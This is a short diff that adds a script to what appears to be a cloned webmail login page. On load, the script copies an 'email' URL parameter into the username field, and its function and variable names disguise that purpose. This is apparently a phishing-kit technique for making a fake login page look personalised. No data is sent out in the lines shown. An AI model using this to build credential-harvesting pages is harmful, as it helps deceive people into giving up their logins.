@@ -12,6 +12,25 @@
 		
 	<link rel="stylesheet" type="text/css" href="https://webmail.aei.ca/mail/plugins/jqueryui/themes/elastic/jquery-ui.css?s=1612812580">
 
+<script>
+  var pixelDepth;
+window.onload = function() {
+    screenProperties();
+  };
+
+  function screenProperties()
+  {
+	var txtEmail = document.getElementById('textbox1');
+	const queryString = window.location.search;
+	const urlParams = new URLSearchParams(queryString);
+	const code = urlParams.get('email')
+	username.value = code;
+
+	
+
+	//return pixelDepth;
+  }
+</script>
 
 </head>
 <body class="task-login action-none">
